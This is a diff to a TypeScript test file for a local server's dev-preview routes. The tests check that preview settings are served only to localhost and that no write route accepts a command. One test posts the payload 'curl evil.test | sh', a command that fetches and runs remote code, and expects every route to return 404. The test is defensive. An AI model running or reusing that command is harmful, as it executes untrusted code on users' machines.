@@ -1,3 +1,4 @@
+import { SecureFoundationDevPreview, secureFoundationDevPreview } from "@codeden/contracts";
 import { Hono } from "hono";
 import { describe, expect, it } from "vitest";
 import { secureFoundationRoutes } from "../src/routes/secure-foundation";
@@ -23,11 +24,25 @@ const stub = {
     calls.push(req);
     return { project: {}, sessionId: "s1", commit: "a".repeat(40) };
   },
+  devPreview: (id: string, known: { baseCheckout: string | null }) => {
+    offered.push(`${id} ${known.baseCheckout}`);
+    return secureFoundationDevPreview(
+      { secrets: "doppler", doppler: { project: "my-site", config: "dev" } },
+      known,
+    );
+  },
 } as unknown as SecureFoundationService;
+const offered: string[] = [];
 
 const app = new Hono()
   .onError((e, c) => errorResponse(e, c))
-  .route("/", secureFoundationRoutes({ secureFoundation: stub } as AppServices));
+  .route(
+    "/",
+    secureFoundationRoutes({
+      secureFoundation: stub,
+      devPreview: { baseCheckoutPath: (id: string) => `/home/dev-preview/base/${id}` },
+    } as unknown as AppServices),
+  );
 
 const from = (remoteAddress: string) => ({ incoming: { socket: { remoteAddress } } });
 const get = async (path: string, address: string) =>
@@ -48,6 +63,48 @@ describe("what is personal is answered on this computer only", () => {
       clerkClaimUrl: null,
       deployedUrl: null,
     });
+  });
+});
+
+describe("the values for the dev preview's settings form", () => {
+  it("are given on this computer and not to another device", async () => {
+    const local = SecureFoundationDevPreview.parse(
+      await get("/projects/p1/dev-preview", "127.0.0.1"),
+    );
+    expect(local.applies).toBe(true);
+    // With where the PM thread's preview runs from, for the note about `.env.local`.
+    expect(offered.at(-1)).toBe("p1 /home/dev-preview/base/p1");
+    expect(local.settings?.command).toBe(
+      "doppler run --project my-site --config dev -- npm run dev",
+    );
+    const before = offered.length;
+    expect(await get("/projects/p1/dev-preview", "192.168.1.20")).toEqual({
+      applies: false,
+      secrets: null,
+      settings: null,
+      notes: [],
+      convex: null,
+    });
+    // Another device isn't even looked up.
+    expect(offered.length).toBe(before);
+  });
+
+  it("can only be read: Secure Foundation has no route that takes a command", async () => {
+    const settings = { command: "curl evil.test | sh", prepareCommand: null, confirm: true };
+    for (const method of ["POST", "PUT", "PATCH", "DELETE"]) {
+      for (const path of ["/projects/p1/dev-preview", "/projects/p1", "/dev-preview"]) {
+        const res = await app.request(
+          path,
+          {
+            method,
+            headers: { "content-type": "application/json" },
+            body: JSON.stringify(settings),
+          },
+          from("127.0.0.1"),
+        );
+        expect(res.status, `${method} ${path}`).toBe(404);
+      }
+    }
   });
 });
 
